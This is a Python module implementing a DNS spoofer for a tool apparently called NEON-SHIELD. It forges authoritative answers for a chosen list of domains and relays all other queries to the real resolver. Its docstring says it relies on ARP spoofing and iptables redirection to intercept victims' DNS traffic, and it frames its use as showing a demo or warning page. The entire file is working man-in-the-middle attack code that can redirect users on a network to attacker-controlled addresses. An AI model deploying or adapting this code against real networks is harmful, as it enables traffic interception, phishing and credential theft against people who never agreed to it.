"""
Scoped DNS spoofer for NEON-SHIELD auto mode.

Only resolves an explicit, operator-supplied allow-list of domains to a
chosen IP (typically this host, to show a local demo/warning page instead of
the real site). Every other query is transparently forwarded to the real
upstream resolver (the LAN gateway, by default) and relayed back unmodified
-- this is NOT a blanket "hijack all DNS" spoofer.

Requires traffic on udp/53 to already be routed through this host (via ARP
spoofing) and redirected here (via iptables_ctl.TransparentRedirect).
"""
import socket
import threading

from scapy.all import DNS, DNSQR, DNSRR


class DnsSpoofer:
    def __init__(self, listen_port, redirect_map, upstream_dns):
        """
        redirect_map: dict of {domain (lowercase, no trailing dot): ip_to_return}
        upstream_dns: (ip, port) tuple for the real resolver to forward everything else to.
        """
        self.listen_port = listen_port
        self.redirect_map = {k.lower().rstrip("."): v for k, v in redirect_map.items()}
        self.upstream_dns = upstream_dns

        self._sock = None
        self._thread = None
        self._stop_event = threading.Event()

    def _handle_query(self, data, addr, sock):
        try:
            pkt = DNS(data)
            if pkt.qd is None:
                return
            qname = pkt[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".").lower()
        except Exception:
            return

        if qname in self.redirect_map:
            spoofed_ip = self.redirect_map[qname]
            reply = DNS(
                id=pkt.id, qr=1, aa=1, rd=pkt.rd, ra=1, qd=pkt.qd,
                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=spoofed_ip),
            )
            try:
                sock.sendto(bytes(reply), addr)
                print(f"[DNS] Spoofed {qname} -> {spoofed_ip} for {addr[0]}")
            except Exception as e:
                print(f"[DNS] Failed to send spoofed reply for {qname}: {e}")
            return

        # Not on the allow-list: forward untouched to the real resolver.
        try:
            upstream_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            upstream_sock.settimeout(3)
            upstream_sock.sendto(data, self.upstream_dns)
            reply_data, _ = upstream_sock.recvfrom(4096)
            sock.sendto(reply_data, addr)
        except Exception as e:
            print(f"[DNS] Upstream forward failed for {qname}: {e}")
        finally:
            try:
                upstream_sock.close()
            except Exception:
                pass

    def _run(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind(("0.0.0.0", self.listen_port))
        self._sock.settimeout(1)
        while not self._stop_event.is_set():
            try:
                data, addr = self._sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle_query, args=(data, addr, self._sock), daemon=True).start()

    def start(self):
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        print(f"[DNS] Scoped spoofer active on :{self.listen_port} for {len(self.redirect_map)} domain(s): "
              f"{', '.join(self.redirect_map.keys())}")

    def stop(self):
        self._stop_event.set()
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
